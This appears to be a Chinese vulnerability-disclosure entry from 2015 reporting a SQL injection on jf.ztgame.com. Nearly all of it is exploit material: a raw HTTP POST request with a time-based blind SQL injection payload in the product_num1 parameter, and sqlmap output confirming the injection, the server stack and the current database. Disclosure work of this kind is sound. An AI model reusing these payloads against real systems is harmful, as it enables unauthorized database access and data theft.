wybug_detail:
漏洞详情 披露状态：   									2015-08-03：	细节已通知厂商并且等待厂商处理中									2015-08-05：	厂商已经确认，细节仅向厂商公开									2015-08-15：	细节向核心白帽子及相关领域专家公开									2015-08-25：	细节向普通白帽子公开									2015-09-04：	细节向实习白帽子公开									2015-09-19：	细节向公众公开  简要描述：   详细说明：  
POST /detail.php?id=1114 HTTP/1.1Content-Length: 147Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://jf.ztgame.com:80/Host: jf.ztgame.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*product_num1=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/





sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: product_num1=if(now()=sysdate(),sleep(0),0)/' AND (SELECT * FROM (SELECT(SLEEP(5)))WgpE) AND 'eAEa'='eAEa'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"/---web application technology: Apache 2.2.25, PHP 5.4.4back-end DBMS: MySQL 5.0.12current database:    'logs'
